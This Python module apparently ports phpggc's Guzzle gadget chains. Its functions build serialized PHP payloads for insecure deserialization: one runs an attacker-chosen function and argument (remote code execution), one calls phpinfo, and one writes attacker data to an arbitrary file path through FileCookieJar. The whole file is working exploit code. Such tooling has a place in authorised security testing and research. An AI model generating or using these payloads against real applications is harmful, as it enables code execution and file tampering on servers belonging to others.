"""Guzzle gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_bool, php_int, php_null, php_obj, php_obj_ref, php_str, priv


def build_rce1(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    stack = php_obj("GuzzleHttp\\HandlerStack", [
        (priv("GuzzleHttp\\HandlerStack", "handler"), php_str(parameter)),
        (priv("GuzzleHttp\\HandlerStack", "stack"), php_arr([
            (php_int(0), php_arr([(php_int(0), php_str(function))])),
        ])),
        (priv("GuzzleHttp\\HandlerStack", "cached"), php_bool(False)),
    ])
    close = php_arr([
        (php_int(0), stack),
        (php_int(1), php_str("resolve")),
    ])
    stream = php_obj("GuzzleHttp\\Psr7\\FnStream", [
        (priv("GuzzleHttp\\Psr7\\FnStream", "methods"), php_arr([
            (php_str("close"), close),
        ])),
        ("_fn_close", php_arr([
            (php_int(0), php_obj_ref(4 + (1 if fast_destruct else 0))),
            (php_int(1), php_str("resolve")),
        ])),
    ])
    return maybe_wrap(stream, fast_destruct)


def build_info1(*, fast_destruct: bool = False) -> bytes:
    stream = php_obj("GuzzleHttp\\Psr7\\FnStream", [
        ("_fn_close", php_str("phpinfo")),
    ])
    return maybe_wrap(stream, fast_destruct)


def build_fw1(remote_path: str, data: str, *, fast_destruct: bool = False) -> bytes:
    cookie = php_obj("GuzzleHttp\\Cookie\\SetCookie", [
        (priv("GuzzleHttp\\Cookie\\SetCookie", "data"), php_arr([
            (php_str("Expires"), php_int(1)),
            (php_str("Discard"), php_bool(False)),
            (php_str("Value"), php_str(data)),
        ])),
    ])
    jar = php_obj("GuzzleHttp\\Cookie\\FileCookieJar", [
        (priv("GuzzleHttp\\Cookie\\CookieJar", "cookies"), php_arr([(php_int(0), cookie)])),
        (priv("GuzzleHttp\\Cookie\\CookieJar", "strictMode"), php_null()),
        (priv("GuzzleHttp\\Cookie\\FileCookieJar", "filename"), php_str(remote_path)),
        (priv("GuzzleHttp\\Cookie\\FileCookieJar", "storeSessionCookies"), php_bool(True)),
    ])
    return maybe_wrap(jar, fast_destruct)
